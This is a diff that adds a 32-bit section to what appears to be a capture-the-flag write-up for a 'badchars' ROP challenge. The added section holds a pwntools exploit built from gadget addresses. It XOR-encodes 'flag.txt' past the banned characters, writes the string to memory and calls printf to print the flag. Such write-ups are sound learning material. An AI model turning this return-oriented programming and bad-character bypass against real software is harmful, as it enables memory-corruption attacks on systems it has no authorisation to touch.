@@ -109,4 +109,62 @@ payload = flat(
 io.sendline(payload)
 ```
 
+## For x86 32 bit
+
+Similar approach like 64 bit , but just payload is become bigger because regs only store 4 bytes and "flag.txt" is 8 bytes so we have to repeat it 2 times.
+
+Vmmap:
+![vmmap](./img/badchars/vmmap32.png)
+
+
+Exploit goes here:
+```python
+# 0x08048547 : xor byte ptr [ebp], bl ; ret
+# 0x0804854f : mov dword ptr [edi], esi ; ret
+# 0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+# 0x080485bb : pop ebp ; ret
+# 0x0804839d : pop ebx ; ret
+# bad chars a x . g
+printf = p32(0x080483D0)
+xory = p32(0x08048547)
+mov = p32(0x0804854f)
+popbig = p32(0x080485b8)
+popbx = p32(0x0804839d)
+popbp = p32(0x080485bb)
+writto = 0x804a070
+
+# >>>print(xor(b'flag.txt',b'fl\xEB\xEB\xEBt\xEBt'))
+# b'\x00\x00\x8a\x8c\xc5\x00\x93\x00'
+
+payload = flat(
+    b'b'*44,
+    popbig,
+    p32(0x8a),
+    b"flag",
+    p32(writto),
+    p32(writto+2),
+    mov,
+    xory,
+    popbig,
+    p32(0x8c),
+    b'.txt',
+    p32(writto+4),
+    p32(writto+3),
+    mov,
+    xory,
+    popbp,
+    p32(writto+4),
+    popbx,
+    p32(0xc5),
+    xory,
+    popbp,
+    p32(writto+6),
+    popbx,
+    p32(0x93),
+    xory,
+    printf,
+    b"xxxx",
+    p32(writto)
+)
+```
 Valar Murgolis!!
